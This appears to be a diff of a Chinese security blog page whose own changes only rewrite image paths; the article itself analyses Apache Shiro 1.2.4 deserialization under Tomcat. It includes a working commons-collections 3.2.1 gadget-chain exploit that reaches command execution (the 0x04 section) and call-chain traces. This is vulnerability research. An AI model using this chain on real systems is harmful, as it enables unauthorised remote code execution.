@@ -20,22 +20,22 @@
 <meta property="og:site_name" content="0kami&#39;s Blog">
 <meta property="og:description" content="0x00 前言在跟了一遍commons-collections系列的payload后，终于可以开始解决一下当时对shiro反序列化模凌两可的认识了。">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191108153248897.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191109160945448.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191109162524242.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191109163048059.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191109164548583.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110110209579.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110141818530.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110143619051.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110143737549.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20200109193558744.png">
-<meta property="og:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110151222301.png">
-<meta property="og:updated_time" content="2020-01-09T11:40:03.821Z">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191108153248897.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191109160945448.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191109162524242.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191109163048059.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191109164548583.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/study-java-deserialized-shiro-1-2-4-20191110/image-20191110110209579.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191110141818530.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191110143619051.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191110143737549.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20200109193558744.png">
+<meta property="og:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191110151222301.png">
+<meta property="og:updated_time" content="2020-11-18T14:07:31.483Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【notes】Java反序列化利用链挖掘之Shiro反序列化">
 <meta name="twitter:description" content="0x00 前言在跟了一遍commons-collections系列的payload后，终于可以开始解决一下当时对shiro反序列化模凌两可的认识了。">
-<meta name="twitter:image" content="http://blog.0kami.cn/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191108153248897.png">
+<meta name="twitter:image" content="http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/image-20191108153248897.png">
 
   <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
   <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
@@ -174,7 +174,7 @@
 <p>这里的解决方案是修改pom.xml</p>
 </li>
 </ol>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191108153248897.png" alt="image-20191108153248897"></p>
+<p><img src="image-20191108153248897.png" alt="image-20191108153248897"></p>
 <p>​            添加jstl的具体版本即可解决。</p>
 <ol start="2">
 <li><p>serialVersionUID不一致导致无法反序列化的问题</p>
@@ -190,14 +190,14 @@
 </ul>
 <p>除了1中在漏洞环境下添加了<code>commons-collections:4.0</code>，另外两篇文章均提到了在tomcat下无法直接利用<code>commons-collections:3.2.1</code>的问题。接下来我们就来看看是什么原因吧：）</p>
 <p><code>org.apache.shiro.io.DefaultSerializer.deserialize:67</code></p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191109160945448.png" alt="image-20191109160945448"></p>
+<p><img src="image-20191109160945448.png" alt="image-20191109160945448"></p>
 <p>这里我们直接看反序列化发生的点，第75行使用了<code>ClassResolvingObjectInputStream</code>类而非传统的<code>ObjectInputStream</code>.这里可能是开发人员做的一种防护措施？他重写了<code>ObjectInputStream</code>类的<code>resolveClass</code>函数，我曾在第一篇<a href="http://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/">基础文章</a>中分析过Java反序列化的过程，<code>ObjectInputStream</code>的<code>resolveClass</code>函数用的是<code>Class.forName</code>类获取当前描述器所指代的类的Class对象。而重写后的<code>resolveClass</code>函数</p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191109162524242.png" alt="image-20191109162524242"></p>
+<p><img src="image-20191109162524242.png" alt="image-20191109162524242"></p>
 <p>采用的是<code>ClassUtils.forName</code>，我们继续看这个forName的实现。</p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191109163048059.png" alt="image-20191109163048059"></p>
+<p><img src="image-20191109163048059.png" alt="image-20191109163048059"></p>
 <p>来看看这个<code>ExceptionIgnoringAccessor</code>是怎么实现的</p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191109164548583.png" alt="image-20191109164548583"></p>
-<p>这里实际上调用了<code>ParallelWebAppClassLoader</code>父类<code>WebappClassLoaderBase</code>的<code>loadClass</code>函数（可以直接下断点看看内容）。<img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110110209579.png" alt="image-20191110110209579"></p>
+<p><img src="image-20191109164548583.png" alt="image-20191109164548583"></p>
+<p>这里实际上调用了<code>ParallelWebAppClassLoader</code>父类<code>WebappClassLoaderBase</code>的<code>loadClass</code>函数（可以直接下断点看看内容）。<img src="study-java-deserialized-shiro-1-2-4-20191110/image-20191110110209579.png" alt="image-20191110110209579"></p>
 <p>该loadClass载入按照上述的顺序（这里不贴代码了，找到<code>org.apache.catalina.loader.WebappClassLoaderBase.loadClass</code>即可），先从cache中找已载入的类，如果前3点都没找到，再通过父类<code>URLClassLoader</code>的<code>loadClass</code>函数载入。但是实际上此时loadClass的参数name值带上了数组的标志，即<code>/Lorg/apache/commons/collections/Transformer;.class</code>，在参考的第二篇文章里有提到这个问题，所以导致shiro无法载入数组类型的对象。</p>
 <p>那么如何才能真正的利用<code>commons-collections:3.2.1</code>来构造利用链呢？</p>
 <p>首先，在参考的第一篇文章里，作者在环境中引入了<code>commons-collections:4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。</p>
@@ -209,7 +209,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject</span><br><span class="line">	-&gt; PriorityQueue.heapify()</span><br><span class="line">	-&gt; PriorityQueue.siftDown()</span><br><span class="line">	-&gt; PriorityQueue.siftDownUsingComparator()</span><br><span class="line">		-&gt; TransformingComparator.compare()</span><br><span class="line">			-&gt; InvokerTransformer.transform()</span><br><span class="line">				-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">				... templates Gadgets ...</span><br><span class="line">					-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>
 <p>在这条链上，由于TransformingComparator在3.2.1的版本上还没有实现Serializable接口，其在3.2.1版本下是无法反序列化的。所以我们无法直接利用该payload来达到命令执行的目的。</p>
 <p>那么就来改造改造吧！我们先将注意力关注在<code>InvokerTransformer.transform()</code>上</p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110141818530.png" alt="image-20191110141818530"></p>
+<p><img src="image-20191110141818530.png" alt="image-20191110141818530"></p>
 <p>这里是最经典的反射机制的写法，根据传入的<code>input</code>对象，调用其<code>iMethodName</code>（可控）。那么如果此时传入的<code>input</code>为构造好的<code>TemplatesImpl</code>对象呢？</p>
 <p>很明显，这样我们就可以通过将<code>iMethodName</code>置为<code>newTransformer</code>，从而完成后续的templates gadgets。</p>
 <p>那么问题来了，怎么将传入的<code>input</code>置为<code>TemplatesImpl</code>对象呢？</p>
@@ -219,9 +219,9 @@
 <p>这里第一条路肯定断了，那么就是怎么利用这个无意义的<code>String</code>了！</p>
 <p>从<code>CommonsCollection5</code>开始，出现了<code>TiedMapEntry</code>，其作为中继，调用了<code>LazyMap</code>（map）的<code>get</code>函数。</p>
 <p>来看一看</p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110143619051.png" alt="image-20191110143619051"></p>
+<p><img src="image-20191110143619051.png" alt="image-20191110143619051"></p>
 <p>其中<code>map</code>和<code>key</code>我们都可以控制，而<code>LazyMap.get</code>调用了<code>transform</code>函数，并将可控的<code>key</code>传入<code>transform</code>函数</p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110143737549.png" alt="image-20191110143737549"></p>
+<p><img src="image-20191110143737549.png" alt="image-20191110143737549"></p>
 <p>这里就接上了我们前面讨论的，将构造好的<code>TemplatesImpl</code>（key）作为<code>InvokerTransformer.transform</code>函数的<code>input</code>传入，我们就可以将templates gadgets串起来了。</p>
 <p>简单来说，我们将<code>CommonsCollections5,6,9</code>构造链中的<code>TiedMapEntry</code>的key用了起来。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo"); //原来的利用方式</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, templates);</span><br></pre></td></tr></table></figure>
@@ -229,7 +229,7 @@
 <p>而在<code>TiedMapEntry</code>前的利用链，在原生shiro环境下，并不冲突（没有数组类型的对象），可以正常反序列化。这一部分就省略了。</p>
 <h4 id="20200108补充"><a href="#20200108补充" class="headerlink" title="20200108补充"></a>20200108补充</h4><p>其实createTemplatesImpl的利用方式中还是存在数组形式的，byte[]数组用于存储evil class。但是在tomcat 7及以上的环境下，java的原生数据类型的数组还原不影响反序列化，只针对对象级别的数组还原。而tomcat6的实现方式直接不允许数组类型的还原，也就是说该利用链在tomcat6的环境下是成功不了的。</p>
 <h3 id="20200109补充"><a href="#20200109补充" class="headerlink" title="20200109补充"></a>20200109补充</h3><p>当应用开启了security manager时，需要设置<code>-Djdk.xml.enableTemplatesImplDeserialization=true</code></p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20200109193558744.png" alt="image-20200109193558744"></p>
+<p><img src="image-20200109193558744.png" alt="image-20200109193558744"></p>
 <h1 id="0x04-EXP编写"><a href="#0x04-EXP编写" class="headerlink" title="0x04 EXP编写"></a>0x04 EXP编写</h1><p>这里其实可以构造出好几个链，我这里就拿<code>HashSet</code>为例，完整的exp见<a href="https://github.com/wh1t3p1g/ysoserial" target="_blank" rel="noopener">MyYsoserial</a>中的<code>CommonsCollections10</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);<span class="comment">// 构造带有evil class bytes的TemplatesImpl</span></span><br><span class="line"><span class="comment">// 构造InvokerTransformer，填充无害的toString函数</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="comment">// 构造LazyMap的factory为前面的InvokerTransformer</span></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"><span class="comment">// 填充TiedMapEntry的map（lazyMap）和key（TemplatesImpl）</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">"foo"</span>);</span><br><span class="line"><span class="comment">// 下述代码将entry填充到HashSet的node的key上，可以使得HashSet在put的时候调用TiedMapEntry的hashCode函数</span></span><br><span class="line">Field f = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField("map");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f);</span><br><span class="line">HashMap innimpl = <span class="keyword">null</span>;</span><br><span class="line">innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">Field f2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f2);</span><br><span class="line">Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">array = (Object[]) f2.get(innimpl);</span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">  node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(keyField);</span><br><span class="line">keyField.set(node, entry);</span><br><span class="line"><span class="comment">// 将最终的触发函数newTransformer装载到InvokerTransformer上</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> map;</span><br></pre></td></tr></table></figure>
 <p>这里不对源码进行讲解了，都写在了注释里。</p>
@@ -237,7 +237,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashSet.readObject()</span><br><span class="line">-&gt; java.util.HashMap.put()</span><br><span class="line">-&gt; java.util.HashMap.hash()</span><br><span class="line">	-&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">	-&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">		-&gt; org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">		-&gt; org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">			-&gt; java.lang.reflect.Method.invoke()</span><br><span class="line">      ... templates gadgets ...</span><br><span class="line">      -&gt; java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>
 <h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>在经过对<code>CommonsCollections</code>系列的利用链进行分析后，在shiro这个问题上，进行了实战，解决了tomcat下无法利用shiro原生的<code>commons-collections:3.2.1</code>这个问题。</p>
 <p>最后，在最近的<a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">shiro-721</a>利用上，这个利用链希望可以帮助到大家</p>
-<p><img src="/assets/study-java-deserialized-shiro-1-2-4-20191110/image-20191110151222301.png" alt="image-20191110151222301"></p>
+<p><img src="image-20191110151222301.png" alt="image-20191110151222301"></p>
 <p>Happy Hacking XD</p>
 <hr>
 
